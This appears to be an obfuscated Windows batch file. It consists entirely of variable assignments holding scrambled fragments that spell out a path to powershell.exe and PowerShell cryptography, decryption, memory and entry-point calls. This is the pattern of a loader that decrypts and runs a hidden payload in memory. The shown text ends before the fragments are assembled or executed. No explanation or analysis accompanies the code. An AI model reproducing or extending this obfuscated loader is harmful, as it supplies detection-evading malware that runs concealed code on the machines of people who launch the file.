@echo off
set "HZrzAiSIvk=py"
set "anVjLeYsTC=he"
set "hFnTbIkhmA=rs"
set "OhJYEmdglP=0\"
set "PTfQMetgZh=\v"
set "KiAoAuypzk=st"
set "jmRBAlQAdQ=ll"
set "nehYEKFNlN=in"
set "zVHLamETLL=rS"
set "TOyVRMuHjw=s\"
set "xsFbmXQWAV=y "
set "jWhZOaIVYF=he"
set "KclkGRDBSu=co"
set "kllakwdHDO=we"
set "sceXVjzIEP=Wi"
set "RRXgLPYwOl=32"
set "OyEeGKSFXd= C"
set "xMYCDmlSBk=ll"
set "fJeMJuGNfr=xe"
set "WWHsuipdkz=:\"
set "wbAnnSBJFl=ws"
set "RAEnWnlnxH=em"
set "iPnQRodlmk=1."
set "ZYEPyKrYer=ow"
set "vHhhOuGKqO= /"
set "ncwZIQQXTo=.e"
set "HBWQwuZbJl=we"
set "XYZVHKokvx=\W"
set "bJjptlygDW=nd"
set "bAVsrTltCK=do"
set "vdQVWpQqmJ=po"
set "kjahbmNsZj=Sy"
set "ZaRatMJYBb=Po"
set "lDgvytDjBP=cd"
set "ozWRiIQTIa= %~dp0"
set "XTcidLCEED=S46e"
set "JZaHunXuqJ=SEK."
set "QtXdLBJBAB=();$"
set "ABInNoqEXO=AoRr"
set "xutSTalvvo='[-1"
set "DRZikzVeQz=.Dis"
set "agWDtlrhsL=se()"
set "IhGCdQHzKi=oint"
set "wFFGfstykY=ress"
set "fCauBRTNWM=pres"
set "KopRNQNHSC= New"
set "oJEZvYidNd=[Sys"
set "UPcaySggGi= if "
set "hGPkiqEpdD=Rr ="
set "zIPTxEMrmd='dqR"
set "TtrkeKEcxL=$Jgz"
set "lAMOHjRXHu=mory"
set "tAXSIHEUyk=[]] "
set "UbHnKyoFHC= = $"
set "ZbcLRwUJPR=ecry"
set "nWYhaXgutb=.Cry"
set "ulZdJuFpdd=$kAo"
set "OBpEBVtaaJ=ck($"
set "gYefdkudBv=raph"
set "CsYMrYrfaN=tem."
set "BWAsjlcdCf=Fina"
set "hlMadQaUKD=pDZz"
